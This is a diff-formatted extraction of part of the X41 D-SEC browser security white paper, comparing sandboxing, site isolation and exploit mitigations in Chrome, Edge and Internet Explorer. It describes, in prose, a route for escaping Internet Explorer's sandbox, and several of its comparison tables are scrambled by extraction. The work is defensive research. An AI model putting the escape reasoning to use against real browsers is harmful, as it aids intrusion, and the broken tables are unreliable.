 Another restriction employed by Google Chrome is the usage of an alternate desktop for sandboxed
 renderers. This means that processes using the main desktop cannot send window messages to the
 sandboxed process and more importantly vice-versa.
 
-
-
-
 X41 D-SEC GmbH                                                                                       Page 41 of 197
 Browser Security White Paper
 
-
-
-
                                  Figure 7.3: Google Chrome Restricted Token
 
-
-
-
                                  Figure 7.4: Internet Explorer Restricted Token
-
 
 7.1.5      Sandbox Inter Process Communication (IPC)
 
@@ -1945,14 +1572,8 @@ Internet Explorer.
 In terms of security IPC is an important attack vector since it may allow bypassing of sandboxing restrictions
  13 https://www.chromium.org/developers/design-documents/mojo/chrome-ipc-to-mojo-ipc-cheat-sheet
 
-
-
-
 X41 D-SEC GmbH                                                                                    Page 42 of 197
 Browser Security White Paper
-
-
-
 
 without exploiting any flaws in the isolation provided by the sandbox. However, attacks using IPC on more
 privileged components of the browser are outside the scope of the sandbox itself. We expect the risk of
@@ -1964,8 +1585,6 @@ security is available on the Microsoft website.
 Google Chrome has documented the dangers of IPC in the sandbox context for use by developers15 . We
 were unable to find a similar document for Microsoft Edge or Internet Explorer, which is likely due to the
 fact that these browsers are (mostly) closed source.
-
-
 
 7.2       SANDBOX TESTING METHODOLOGY
 
@@ -1991,7 +1610,6 @@ The testing code runs a number of third-party applications that are specifically
 and effectiveness of sandboxes and hardening techniques. For the sandboxing tests, we used the sandbox-
 attack-surface-analysis-tools17 developed by James Forshaw. Specifically, we employed:
 
-
     • CheckFileAccess to determine what files and folders a process can access on the local file system.
        The command-line used for these tests is:
        CheckFileAccess -q -r -w pid=<process id> “%SystemDrive%”
@@ -2000,13 +1618,8 @@ attack-surface-analysis-tools17 developed by James Forshaw. Specifically, we emp
  16 https://github.com/SkyLined/BugId
  17 https://github.com/google/sandbox-attacksurface-analysis-tools
 
-
-
 X41 D-SEC GmbH                                                                                      Page 43 of 197
 Browser Security White Paper
-
-
-
 
     • CheckNetworkAccess to determine if a process can make network connections on the loopback
        device, over the intranet and to the Internet. As well as determine if a process can accept incoming
@@ -2039,7 +1652,6 @@ Browser Security White Paper
           – To test if the process can access any of the local machine’s registry keys:
               CheckRegistryAccess -w -r -p <process id> hkey_local_machine
 
-
 These tests take the access token for each process and use it to attempt to access the relevant resources. If
 this succeeds, it proves that an attacker running inside the sandbox could access this resource.
 
@@ -2053,12 +1665,8 @@ but through additional custom techniques. It may be possible for a clever attack
 These tools were run and their output parsed automatically to produce a number of reports for each
 process. The name of these reports can indicate if a test has passed (e.g. the sandbox is preventing access
 
-
 X41 D-SEC GmbH                                                                                      Page 44 of 197
 Browser Security White Paper
-
-
-
 
 to the relevant resource) or failed (e.g. the process can access all or parts of the relevant resource). If a test
 has failed, the report shows which parts of the resource the process is able to access. It could be that partial
@@ -2073,11 +1681,7 @@ Note that as explained above, the level of access an AppContainer with the inter
 to the local network depends on the network category, as shown in the Networking and Sharing Center
 (Control Panel\All Control Panel Items\Network and Sharing Center, see figure 7.5 ).
 
-
-
-
                           Figure 7.5: Networking and Sharing Center showing a private network
-
 
 To determine to what extent this level of access differs between Public and Private networks, we ran
 our tests for Microsoft Edge twice for both types. To change the network category we used the Set-
@@ -2090,14 +1694,8 @@ For the sake of brevity, we will not provide full lists of all files and registr
 processes can access; we will only provide a general description of their level of access. If you are interested
 in the details, you can grab the test and a sample results set from our github repository.
 
-
-
-
 X41 D-SEC GmbH                                                                                        Page 45 of 197
 Browser Security White Paper
-
-
-
 
 7.3       GOOGLE CHROME SANDBOX
 
@@ -2114,8 +1712,6 @@ to regular webpages.
 
 See table 7.1 for test results for the various process types.
 
-
-
 7.3.1      Main process
 
                                  Resource                            Access
@@ -2129,8 +1725,6 @@ See table 7.1 for test results for the various process types.
 
                                Table 7.1: Google Chrome Main Process Sandbox
 
-
-
 The main process hosts the Google Chrome UI Windows and handles network traffic among other things. It
 is not sandboxed and runs at medium integrity. It has the same level of access to the system as the user
 running Google Chrome has. Because it handles network traffic, including processing of the protocols used
@@ -2141,14 +1735,8 @@ prone to vulnerabilities. Because it operates on attacker supplied data, it is a
 X41 D-Sec GmbH would like to suggest that this will be moved to a separate, sandboxed process to limit the
 potential damage of a vulnerability in this component.
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 46 of 197
 Browser Security White Paper
-
-
-
 
 7.3.2      type=crashpad-handler and type=watcher processes
 
@@ -2163,8 +1751,6 @@ Browser Security White Paper
 
                                   Table 7.2: Google Chrome Crashpad Process Sandbox
 
-
-
 The crashpad handler (see table 7.2) and watcher processes handle gathering statistics and reporting
 crashes in Google Chrome back to Google. Neither of these is sandboxed and both run at medium integrity.
 They have the same level of access to the system as the user running Google Chrome has. Any vulnerability
@@ -2175,8 +1761,6 @@ As far as X41 D-Sec GmbH knows, there have been no public reports of vulnerabili
 ponents, meaning they are either simple enough to be relatively robust, or they have not received much
 attention from external security researchers. X41 D-Sec GmbH would nevertheless like to suggest consid-
 ering sandboxing these processes, as we assume the access to resources they require is not prohibitive.
-
-
 
 7.3.3      type=renderer and type=ppapi processes
 
@@ -2191,27 +1775,20 @@ ering sandboxing these processes, as we assume the access to resources they requ
 
                                Table 7.3: Google Chrome Render and PPAPI Process Sandbox
 
-
-
 The renderer process (see table 7.3) in Google Chrome is used to render webpages. It parses HTML,
 Scalable Vector Graphics (SVG), Cascading Style Sheets (CSS), images, runs JavaScript, etc. PDF files are
 rendered in this type of process as well. These components are all complex and contain a lot of surface area
 in which to find vulnerabilities. The majority of the vulnerabilities found in Google Chrome so far have been
 in code that runs inside renderer processes. The Pepper Plugin API (PPAPI) process is used to host plug-ins
 
-
 X41 D-SEC GmbH                                                                                    Page 47 of 197
 Browser Security White Paper
-
-
-
 
 such as Flash, the code for which is complex and has had many vulnerabilities reported in the past.
 
 Sandboxing of these two processes is paramount, as they are the most likely attack vector. We consider
 them well-sandboxed: they both run at untrusted integrity level, which severely limits their access to
 objects on the system as follows:
-
 
     • File access: these processes cannot access any part of the file system.
 
@@ -2220,9 +1797,6 @@ objects on the system as follows:
     • Registry access: these processes cannot access any part of the registry.
 
     • Process access: these processes cannot access any other processes.
-
-
-
 
 7.3.4      type=gpu-process
 
@@ -2237,13 +1811,10 @@ objects on the system as follows:
 
                                   Table 7.4: Google Chrome GPU Process Sandbox
 
-
-
 The Graphics Processing Unit (GPU) process (see table 7.4) is used to implement WebGL, which is a
 JavaScript API for rendering graphics. It allows hardware acceleration, which requires access to the
 graphics hardware. In Google Chrome this means the process cannot be sandboxed as firmly as other
 processes and does have more access to the system. The GPU process runs at low integrity.
-
 
     • File access: this process is able to access the folders %ProgramData%\Microsoft\DeviceSync with nearly
        full access and %ProgramData%\Microsoft\PlayReady with full access.
@@ -2257,25 +1828,18 @@ processes and does have more access to the system. The GPU process runs at low i
        QueryValue, SetValue, CreateSubKey, EnumerateSubKeys, Notify, CreateLink, ReadControl,
        WriteDac, and WriteOwner.
 
-
 X41 D-SEC GmbH                                                                                   Page 48 of 197
 Browser Security White Paper
-
-
-
 
     • Process access: this process can access various other processes. The processes it can access are a
        sub-set of all the processes running as the currently logged-in user. It has the following access rights
        to these: Terminate, QueryLimitedInformation, and Synchronize.
-
-
 
 7.4       MICROSOFT EDGE SANDBOX
 
 Microsoft Edge uses AppContainers to implement its sandbox 18 . Besides the sandboxed processes, which
 we will describe in more details below, Edge uses a number of utility processes that are not sandboxed. This
 includes:
-
 
     • browser_broker.exe: a special broker process that brokers access to various resources that the sand-
        boxed processes cannot access directly,
@@ -2285,14 +1849,12 @@ includes:
 
     • ApplicationFrameworkHost.exe: a process that handles UI window creation for all UWP apps,
 
-
 UWP apps like Microsoft Edge have access to various OS features that are implemented in separate
 processes such as RuntimeBroker.exe and ApplicationFrameworkHost.exe. They may provide opportunities
 for an attacker to attempt to escape a sandbox, because they can be interacted with from Microsoft Edge.
 However, these processes are part of the UWP framework, and therefore outside of the scope of this paper.
 
 Microsoft documents Microsoft Edge uses various different AppContainers to separate its components:
-
 
     • Manager AppContainer: provides general browser UI features such as navigation buttons, address
        bar, tabs, favorites, etc.
@@ -2308,19 +1870,12 @@ Microsoft documents Microsoft Edge uses various different AppContainers to separ
     • Services UI AppContainer: hosts Microsoft Edge UI websites, such as about:flags, new tab page,
        etc. . .
 
-
 Note that the internal PDF reader does not run in a separate type of sandbox, but in an intranet/Internet
 AppContainer similar to regular webpages.
  18 https://blogs.windows.com/msedgedev/2017/03/23/strengthening-microsoft-edge-sandbox/
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 49 of 197
 Browser Security White Paper
-
-
-
 
 Unfortunately, Microsoft does not explain how these AppContainers differ from each other and provides no
 information to help map running Microsoft Edge processes to the above list. All AppContainers except the
@@ -2346,8 +1901,6 @@ access to other resources on the same origin. Investigating this further was out
 
 The various AppContainers and their capabilities are detailed below.
 
-
-
 7.4.1      Manager AppContainer
 
                                 Resource                          Access
@@ -2361,21 +1914,13 @@ The various AppContainers and their capabilities are detailed below.
 
                                Table 7.5: Microsoft Edge Manager AppContainer Sandbox
 
-
-
 AppContainer Manager (see table 7.5) is the main browser process for Microsoft Edge and runs at low
 integrity.
 
 This process has the following named capabilities:
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 50 of 197
 Browser Security White Paper
-
-
-
 
     • internetClient,
 
@@ -2401,9 +1946,7 @@ Browser Security White Paper
 
     • confirmAppClose.
 
-
 We will discuss these grouped by the resources they grant access to.
-
 
     • File access: this process is able to access all files and folders in the %ProgramData%\Microsoft\Windows\-
        WER folder, which belongs to Windows Error Reporting. It can also access all files in all sub-folders
@@ -2425,14 +1968,8 @@ We will discuss these grouped by the resources they grant access to.
        processes have even tighter controlled sandboxes, so compromising them would be a step downwards
        in privilege for an attacker.
 
-
-
-
 X41 D-SEC GmbH                                                                                      Page 51 of 197
 Browser Security White Paper
-
-
-
 
     • Registry access: this process has full access to a number of keys in the HKEY_CURRENT_USER hive. The
        process also has access in a number of locations in the HKEY_LOCAL_MACHINE hive, but access to some
@@ -2452,11 +1989,8 @@ Browser Security White Paper
        specific policies through the enterpriseDataPolicy capability. It can add and access software and
        hardware certificates in the Shared User store through the sharedUserCertificates capability.
 
-
 The other capability SIDs assigned to this AppContainer do not appear to be relevant to the security of the
 sandbox.
-
-
 
 7.4.2      Non-Management AppContainers
 
@@ -2471,8 +2005,6 @@ sandbox.
 
                                Table 7.6: Microsoft Edge Non-Manager AppContainer Sandbox
 
-
-
 The remaining processes are used to render and show web resources, such as webpages, media files,
 WebGL, Flash, PDF files (using a built-in PDF reader), extensions and application UI such as the new tab
 page and about:flags. Microsoft refers to these as different AppContainers, but we found them to have
@@ -2481,14 +2013,8 @@ of AppContainer (see table 7.6). However, access to the file system and registry
 processes, and can be used to uniquely identify the various types of sandbox mentioned by Microsoft in
 their blog post.
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 52 of 197
 Browser Security White Paper
-
-
-
 
     • File access: All these processes are able to access all files and folders in the %ProgramData%\Microsoft\-
        Windows\WER folder, which belongs to Windows Error Reporting. They can also access some files in
@@ -2532,17 +2058,10 @@ Browser Security White Paper
        this might not be sufficient.
  19 https://github.com/x41sec/browser-security-whitepaper-2017/
 
-
-
-
 X41 D-SEC GmbH                                                                                         Page 53 of 197
 Browser Security White Paper
 
-
-
-
                                Figure 7.6: Microsoft Edge Content-Process Network Access
-
 
        As shown in figure 7.6 we can confirm that content processes are also actively using network access
        they have and this appears to be by design.
@@ -2571,14 +2090,8 @@ Browser Security White Paper
        The type 004 and 121 AppContainers also have access to the \REGISTRY\USER\<userid>\Softwa
        re\Microsoft\Windows\WindowsErrorReporting\Plugins key.
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 54 of 197
 Browser Security White Paper
-
-
-
 
        This access to the registry should not offer an attacker an immediate vector to sandbox escapes or
        other security issues and allows the different types of AppContainers to store data outside the reach
@@ -2588,14 +2101,8 @@ Browser Security White Paper
        not appear to differ from the other AppContainers in any significant way, we do not consider them an
        additional security risk and did not further investigate.
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 55 of 197
 Browser Security White Paper
-
-
-
 
 7.5       INTERNET EXPLORER SANDBOX (PROTECTED MODE)
 
@@ -2609,7 +2116,6 @@ Browser Security White Paper
                                        Process                              Allowed
 
                                    Table 7.7: Internet Explorer UI / Frame Process Access
-
 
 On versions of Microsoft Windows before version 10, Internet Explorer could be run in EPM: Internet
 Explorer was run as a UWP app (aka Metro style app) that used AppContainers to improve the sandbox.
@@ -2635,22 +2141,14 @@ integrity.
 
                                     Table 7.8: Internet Explorer Content Process Access
 
-
-
 The low integrity processes are not sandboxed very well (see table 7.8); they have access to some parts of
 the file system, can accept and make connections on the loopback device and local network and connect to
 the Internet, can enumerate the processes running as the user on the local system and access some of their
 properties (Terminate|QueryLimitedInformation|Synchronize access rights), and access some parts of the
 registry. A full list of everything these processes have access to can be found in the GitHub repository.
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 56 of 197
 Browser Security White Paper
-
-
-
 
 Of particular interest is the ability to bind to a network port, and that local intranet pages are hosted in
 processes running at medium integrity. An attacker able to exploit an issue in Internet Explorer to run
@@ -2659,78 +2157,47 @@ could then navigate to a webpage on this local web-server, which will be conside
 therefore hosted in a medium integrity process. The attacker can then exploit the same issue again to
 execute arbitrary code in the medium integrity process and escape the sandbox.
 
-
-
 7.6        SANDBOX ACCESS COMPARISON
 
 The below table (see table 7.9) gives an overview of the potential attack surface exposed to an attacker
 for all sandboxed processes in all browsers. We have left all non-sandboxed processes out of this table for
 brevity.
 
-
-
-
                                                                                     pback
                                                                                  and loo
                                                                                   s
                                                                            etwork
 
-
-
                                                                                                inding
-
 
                                                                                                              tem
                                                                                 n
                                                               ork
 
-
-
-
                                                                                                                              try
-
 
                                                                                                                                            ss
                                                                         Private
 
-
-
-
                                                                                                           File sys
                                                                                              d Port b
-
-
-
 
                                                                                                                                            d Proce
                                                              d Netw
 
-
-
-
                                                                                                                       d Regis
                                                                              d
-
-
-
 
                                                                                                                d
                                                            Blocke
 
-
                                                                       Blocke
-
-
-
 
                                                                                             Blocke
 
-
                                                                                                         Blocke
 
-
                                                                                                                      Blocke
-
 
     Process                                                                                                                          Blocke
 
@@ -2756,8 +2223,6 @@ brevity.
                  Table 7.9: Comparison of Sandbox Access to Resources ( - True, # - False, G
                                                                                            # - Partly)
 
-
-
 Since untrustworthy content is processed by browsers, all browsers have content or renderer processes
 with more restricted privileges. As shown in table 7.9 the Google Chrome renderer and PPAPI processes
 have the least access rights while content processes of Internet Explorer have at least partial access to
@@ -2767,12 +2232,8 @@ the network stack and can connect to public networks.
 
 Very interesting from an attackers point of view are processes such as the Manager AppContainer in Mi-
 
-
 X41 D-SEC GmbH                                                                                                                     Page 57 of 197
 Browser Security White Paper
-
-
-
 
 crosoft Edge or the GPU process in Google Chrome. They are used for actions that need access to more
 sensitive resources such as the graphics drivers or authentication credentials. However, they are also
@@ -2787,9 +2248,6 @@ rendering and GPU access or utility processes that execute specific tasks.
 In conclusion, we consider the level of sandboxing in Google Chrome to be the most restrictive and most
 secure. We think this is because Google Chrome separates and compartmentalizes tasks into individual
 processes that can be sandboxed more restrictively.
-
-
-
 
 X41 D-SEC GmbH                                                                              Page 58 of 197
 8        Process and Origin Isolation
@@ -2823,14 +2281,8 @@ data and compromise of privileged origins.
   3 https://en.wikipedia.org/wiki/Same-origin_policy
   4 https://www.chromium.org/developers/design-documents/site-isolation
 
-
-
-
                                                        59
 Browser Security White Paper
-
-
-
 
 8.1       IMPLEMENTATIONS OF PROCESS ISOLATION
 
@@ -2856,8 +2308,6 @@ setting pages, and extensions. The results are as shown in the following table 8
                                Table 8.1: Site Isolation Results ( - True, # - False, G
                                                                                       # - Partly)
 
-
-
 We did not find a suitable example for a Microsoft Edge extension to extensively test isolation due to the
 limited number of available extensions. Also, due to the complexity of IPC and authorization enforcement
 of the web browser we could not completely test the enforcement of resource access restrictions by the
@@ -2866,8 +2316,6 @@ might be possible that the broker incorrectly gives access to resources via IPC 
 available to the requester. This should be considered when further hardening isolation.
 
 We describe the results of the tests in the following.
-
-
 
 8.1.1      Process Level Isolation in Google Chrome
 
@@ -2882,22 +2330,12 @@ opening the Uniform Resource Locator (URL) https://chrome.google.com/webstore/ca
 ?hl=de in a pop-up window using window.open, Google Chrome spawned a new process to host the web-
 store.
 
-
-
-
 X41 D-SEC GmbH                                                                                                 Page 60 of 197
 Browser Security White Paper
 
-
-
-
                                Figure 8.1: Google Chrome Process Isolation Webstore
 
-
-
-
                                     Figure 8.2: Google Chrome Missing Isolation
-
 
 Other sensitive sites such as https://myaccount.google.com are hosted in the same process as the one
 from which they are opened, as seen in figure 8.2. To demonstrate the impact of a compromised renderer, a
@@ -2911,48 +2349,29 @@ the page that opened it.
 
 Also, resources loaded by a webpage using for instance script or image HTML tags are processed inside the
 
-
 X41 D-SEC GmbH                                                                                  Page 61 of 197
     Browser Security White Paper
-
-
-
 
                                                                                          (b) iFrame
                       (a) Crash Missing Isolation
 
                                               Figure 8.3: Google Chrome Renderer
 
-
-
-
                                          Figure 8.4: Google Chrome Extension Isolation
-
 
     same renderer even when they are from different origins. We confirmed that content from different origins
     is loaded into the memory of a single renderer by using an image tag, i.e.
 
-
-
 1   <img src='https://myaccount.google.com'>
-
-
-
 
     For script tags this is partly mitigated because strict Multipurpose Internet Mail Extensions (MIME) type
     checking prevents non-scripts from being loaded from different origins. This prevents for example the
     loading of https://myaccount.google.com inside a script tag.
 
-
-
     X41 D-SEC GmbH                                                                                    Page 62 of 197
 Browser Security White Paper
 
-
-
-
 8.1.1.1     Google Chrome Experimental Site-Per-Process Support
-
 
                                     Isolation                   Google Chrome
 
@@ -2969,26 +2388,15 @@ Browser Security White Paper
             Table 8.2: Google Chrome Experimental Site Isolation Overview ( - True, # - False, G
                                                                                                # - Partly)
 
-
-
 Google Chrome also has experimental support for full process level isolation as described in the documen-
 tation5 . The updated results are displayed in figure 8.2.
 
-
-
-
    5 https://www.chromium.org/developers/design-documents/site-isolation
-
-
 
 X41 D-SEC GmbH                                                                                           Page 63 of 197
 Browser Security White Paper
 
-
-
-
                                Figure 8.5: Google Chrome Process Isolation Experimental
-
 
 We confirmed that all iframes and tabs with different origins are isolated in individual processes as shown
 in figure 8.5. This is even true for 100 webpages in different origins opened via the JavaScript window.open
@@ -3010,22 +2418,15 @@ and checking the memory space of the renderer responsible for handling this site
 XMLHttpRequest (XHR) or fetch API requests but assume behaviour will be similar to handling script
 tags.
 
-
-
 8.1.2      Process Level Isolation in Microsoft Edge
 
 Microsoft Edge currently has no process level isolation between different Internet origins; webpages from
 different domains are hosted in the same process when opened using window.open or iframes. The settings
 
-
 X41 D-SEC GmbH                                                                                   Page 64 of 197
 Browser Security White Paper
 
-
-
-
                                       Figure 8.6: Microsoft Edge Site Isolation
-
 
 are hosted in a different AppContainer and therefore in a different process.
 
@@ -3041,14 +2442,8 @@ different AppContainer and content process when it is navigated to from a tab th
 website.
    6 http://www.telerik.com/fiddler
 
-
-
-
 X41 D-SEC GmbH                                                                                   Page 65 of 197
 Browser Security White Paper
-
-
-
 
 8.1.3      Process Level Isolation in Internet Explorer
 
@@ -3057,8 +2452,6 @@ ferent domains are hosted in the same process when opened using window.open or i
 page is not part of the web browser as such, but part of the Windows Control Panel and is therefore not
 hosted in the same process as any webpage. The downloads and extension pages are displayed by the
 parent (non-sandboxed) process and are therefore also not in the same process as any webpage.
-
-
 
 8.2       PROCESS SPAWNING AND EXPLOITATION
 
@@ -3086,9 +2479,6 @@ amount of time. We have tested that it is possible to find much higher numbers a
 crashes before doing so. Various optimizations to the code should allow an attacker to speed up this test
 significantly, such as using multiple domains to test several values in parallel.
 
-
-
-
 X41 D-SEC GmbH                                                                                        Page 66 of 197
 9        Hardening and Exploit Mitigation
 
@@ -3103,8 +2493,6 @@ below in subsection 9.3.13.0.1.
 It can be debated whether the above techniques are hardening or sandboxing techniques but that discussion
 is not relevant to their functioning or impact on security. We have left that discussion out of this paper and
 chosen to cover all of these in this chapter.
-
-
 
 9.1     TESTING METHODOLOGY
 
@@ -3125,20 +2513,13 @@ applied in the process, but simply checks if the OS reports them as enabled in t
   1 https://www.powershellgallery.com/packages/ProcessMitigations/1.0.7
   2 https://github.com/NetSPI/PESecurity
 
-
-
                                                      67
 Browser Security White Paper
-
-
-
 
 tool does not attempt to execute code in non-executable memory to test if Data Execution Prevention (DEP)
 is enabled, nor does it test if binaries are loaded at random addresses to test if ASLR is enabled. These
 hardening techniques are implemented in the OS, which is not part of the browser and not covered by this
 paper: we assume the OS has implemented these mitigations correctly.
-
-
 
 9.2       NOMENCLATURE
 
@@ -3151,8 +2532,6 @@ Guard (CIG). Both appear to refer to a combination of Signature Checks, Child Pr
 process to spawn child processes), and Arbitrary Code Guard (ACG). In such cases, we use what we found
 to be the most common name for each individual hardening technique and do not cover or mention any of
 these groups.
-
-
 
 9.3       HARDENING TECHNIQUES
 
@@ -3174,7 +2553,6 @@ Explorer.
                                          G                   G
                                                              #                  #
              DEP                                                                G
-                                                                                #
              HIGHENTROPYVA
              No Extension Point DLLs     #
                                          G                   G
@@ -3194,12 +2572,8 @@ Explorer.
              Signature checks            #                   #
                                                              G                  #
 
-
 X41 D-SEC GmbH                                                                                      Page 68 of 197
 Browser Security White Paper
-
-
-
 
              System Fonts only                 #
                                                G                   #                    #
@@ -3211,8 +2585,6 @@ Browser Security White Paper
                        Table 9.1: Comparison of Hardening Features ( - True, # - False, G
                                                                                         # - Partly)
 
-
-
 9.3.1       /GS
 
 /GS3 detects some attempts to write data outside the bounds of a stack-based buffer by checking if a
@@ -3223,8 +2595,6 @@ uses these copies rather than the original values in the function, to reduce the
 write modifying the value of these arguments.
 
 All tested browsers enable /GS in all their processes.
-
-
 
 9.3.2       Arbitrary Code Guard (ACG)
 
@@ -3245,21 +2615,14 @@ It would make sense to enable ACG in all processes that do not need the features
 appear that this includes more processes of all the tested browsers then are currently protected. X41
 D-Sec GmbH advises all vendors to consider enabling ACG for as many processes as possible.
 
-
-
 9.3.3       Address Space Layout Randomization (ASLR)
 
 ASLR prevents data and/or code from being located at a static address in all instances of a process to
 prevent an attacker from using the predictability of these addresses in an exploit. It causes the location of
    3 https://docs.microsoft.com/en-us/cpp/build/reference/gs-buffer-security-check
 
-
-
 X41 D-SEC GmbH                                                                                        Page 69 of 197
 Browser Security White Paper
-
-
-
 
 various data and code in memory to be chosen at random, so that any attempt to use a static address in an
 exploit is unlikely to point to the correct memory, most likely resulting in an access violation. An application
@@ -3299,18 +2662,11 @@ to not load any module that has had its relocation information stripped to preve
 such a module. None of the tested browsers does this. X41 D-Sec GmbH advises all vendors to enable this
 mitigation.
 
-
-
-
      4 https://docs.microsoft.com/en-us/cpp/build/reference/dynamicbase-use-address-space-layout-randomizati
 on
 
-
 X41 D-SEC GmbH                                                                                      Page 70 of 197
 Browser Security White Paper
-
-
-
 
 9.3.4       Allocator Hardening
 
@@ -3329,20 +2685,13 @@ Browser Security White Paper
                        Table 9.2: Comparison of Memory Allocators ( - True, # - False, G
                                                                                        # - Partly)
 
-
-
 This section compares the allocators used by the different browsers. A feature comparison can be seen in
 table 9.2, for details read the descriptions.
 
-
-
 9.3.4.1     Allocators of Google Chrome
-
 
 The Google Chrome browser uses four different allocators, which have different security properties and are
 used in different parts of the browser. These are Oilpan, PartitionAlloc, Discardable memory and malloc.
-
-
 
 9.3.4.1.1     Oilpan Oilpan is a memory allocator with an integrated Garbage Collector (GC). The GC
 ensures that memory is only freed and available for a new allocation once it is ensured that it is no longer
@@ -3364,14 +2713,8 @@ canary (magic_ ) on 64-bit systems. This overwrite protection is missing on prod
 CDesign.md
   6 https://struct.github.io/oilpan_metadata.html
 
-
-
-
 X41 D-SEC GmbH                                                                                         Page 71 of 197
 Browser Security White Paper
-
-
-
 
 9.3.4.1.2 PartitionAlloc Google Chrome uses the PartitionAlloc allocator for the Blink layout engine
 (as default allocator, for everything not handled by Oilpan) and pdfium PDF renderer, to prevent certain
@@ -3382,7 +2725,6 @@ page, therefore overflows can not corrupt it, which prevents certain classical h
 techniques.
 
 PartitionAlloc provides the following security features7 :
-
 
     • Linear overflows cannot corrupt into the partition.
 
@@ -3402,7 +2744,6 @@ PartitionAlloc provides the following security features7 :
 
     • Large allocations are guard-paged at the beginning and end.
 
-
 A fork exists, which contains further hardening features8 , for example additional randomization, clearing
 of data at allocation and freeing time as well as a delayed free and improved double-free detection. This
 shows, that there is room for improvement security wise, which has several performance drawbacks. The
@@ -3415,8 +2756,6 @@ engine. PDFium uses PartitionAlloc partitions for string types, general allocati
 Buffers. Each of these partitions contains several buckets, which group similar sized objects of the partition
 together.
 
-
-
 9.3.4.1.3     Discardable memory Discardable memory9 is used to cache large objects on memory con-
 strained systems. If memory pressure occurs, objects which are not locked can get discarded to free
   7 https://chromium.googlesource.com/chromium/src/+/dcc13470a/third_party/WebKit/Source/wtf/PartitionAllo
@@ -3424,20 +2763,13 @@ c.md#Security
   8 https://github.com/struct/HardenedPartitionAlloc
   9 https://docs.google.com/document/d/1aNdOF_72_eG2KUM_z9kHdbT_fEupWhaDALaZs5D8IAg/edit
 
-
-
 X41 D-SEC GmbH                                                                                    Page 72 of 197
 Browser Security White Paper
-
-
-
 
 formerly allocated memory. The allocations are implemented using memory mapped files (see src/base/-
 memory/shared_memory.h in Chromium source code). Discardable memory does not seem to offer any
 security hardening features by itself. Randomization is partly possible, depending on the mmap() implemen-
 tation of the OS.
-
-
 
 9.3.4.1.4     malloc malloc() is the default OS allocator, which is used in the cases not covered by the other
 allocators. The malloc() implementation and hardening differs based on the OS. Usually, memory is wiped
@@ -3445,15 +2777,10 @@ neither on malloc() nor free(), but most modern operating systems like Microsoft
 randomize the base address of the heap and other hardening features. In Microsoft Windows 8 additional
 heap hardening features were introduced10 and further improved in Microsoft Windows 1011 .
 
-
-
 9.3.4.2     Allocators of Microsoft Edge and Internet Explorer
-
 
 Microsoft Microsoft Edge and Internet Explorer on Microsoft Windows also use several techniques to
 harden heap allocators against exploitation attempts.
-
-
 
 9.3.4.2.1     Memory Garbage Collection (Memory Garbage Collection (MemGC)) The heap allocators
 used in Microsoft Edge and Internet Explorer have gone through a number of steps to harden against
@@ -3470,8 +2797,6 @@ as the JavaScript engines (chakra.dll and jscript9.dll respectively).
 MemGC was preceded by IsolatedHeap and Memory Protector, both of which have been replaced entirely
 by MemGC.
 
-
-
 9.3.4.2.2     Heap Isolation   Before Microsoft Edge was available, Internet Explorer introduced a mitiga-
 tion called IsolatedHeap, which was a separate heap used to store all and only DOM Objects. This made it
 hard for an attacker to exploit certain vulnerabilities by manipulating the heap because many commonly
@@ -3481,23 +2806,14 @@ pdf
  11 https://github.com/MicrosoftDocs/windows-itpro-docs/blob/master/windows/threat-protection/overview-o
 f-threat-mitigations-in-windows-10.md#windows-heap-protections
 
-
-
-
 X41 D-SEC GmbH                                                                                     Page 73 of 197
 Browser Security White Paper
-
-
-
 
 attacks using a common technique called “heap feng-shui”12 . IsolatedHeap itself is no longer used when
 MemGC is enabled in Microsoft Edge and Internet Explorer (the default settings), but MemGC allocates all
 objects in a separate heap similar to IsolatedHeap. Thus, MemGC provides the same kind of mitigation.
 
-
-
 9.3.4.3     JavaScript memory management in Internet Explorer
-
 
 The JavaScript engine of Internet Explorer is implemented in jscript9.dll. When objects are created, the
 engine in jscript9.dll mostly allocates memory directly on the main process’ heap. Some objects are allocated
@@ -3507,16 +2823,11 @@ easy-to-control data, such as arrays and strings, are allocated on a heap that i
 vulnerable components and can often be used in exploits to control the contents of the heap. This used to
 be of particular concern in Internet Explorer until the introduction of heap isolation.
 
-
-
 9.3.4.4     JavaScript memory management in Microsoft Edge
-
 
 The JavaScript engine of Microsoft Edge, called Chakra, has a more sophisticated memory manager on
 which MemGC is based. The security of both the memory manager used by Chakra and MemGC are
 therefore the same; please see above for details on MemGC.
-
-
 
 9.3.5      Control Flow Guard (CFG)
 
@@ -3539,14 +2850,8 @@ not affect the effectiveness of CFG in mitigating vftable overwrites.
   15 http://blog.trendmicro.com/trendlabs-security-intelligence/control-flow-guard-improvements-windows
 -10-anniversary-update/
 
-
-
-
 X41 D-SEC GmbH                                                                                         Page 74 of 197
 Browser Security White Paper
-
-
-
 
 All three browsers enable CFG during compile time, but the coverage highly differs as can be seen in
 table 9.3, which shows the number of functions in the main binaries, which are protected by CFG. When
@@ -3567,8 +2872,6 @@ how well the different helper libraries are protected by CFG.
 
                                              Table 9.3: CFG Coverage
 
-
-
 All tested browsers use CFG, but Google Chrome does not use it for internal functions, since Google intends
 to switch to clang and CFI to protect the control flow17 . The following binaries are not protected in Google
 Chrome: chrome.dll, chrome_elf.dll, chrome_watcher.dll, chrome_child.dll, libegl.dll and libglesv2.dll. X41 D-Sec
@@ -3579,8 +2882,6 @@ None of the tested browsers does this. The mitigation makes no sense for Google 
 does not implement CFG itself. Therefore, asking the OS not to load any binary without CFG would prevent
 it from loading its own binaries. However, for Microsoft Edge and Internet Explorer, X41 D-Sec GmbH
 suggests enabling forced CFG as a defense-in-depth.
-
-
 
 9.3.6      Child Process Policy
 
@@ -3594,14 +2895,8 @@ resumed/terminated and cannot interfere with its functioning.
  16 https://www.hex-rays.com/products/ida/
  17 https://medium.com/@justin.schuh/securing-browsers-through-isolation-versus-mitigation-15f0baced2c2
 
-
-
-
 X41 D-SEC GmbH                                                                                          Page 75 of 197
 Browser Security White Paper
-
-
-
 
 If a Child Process Policy is set to deny creating new processes, the process is not allowed to create any
 other process directly (e.g. using WinExec) or indirectly (e.g. through an out-of-process COM server).
@@ -3615,8 +2910,6 @@ Master AppContainer. Of all these processes that have not enabled the mitigation
 Google Chrome main process actually needs to run child processes. Assuming this is the case, X41 D-Sec
 GmbH would suggest enabling this in the other processes as a defense in depth.
 
-
-
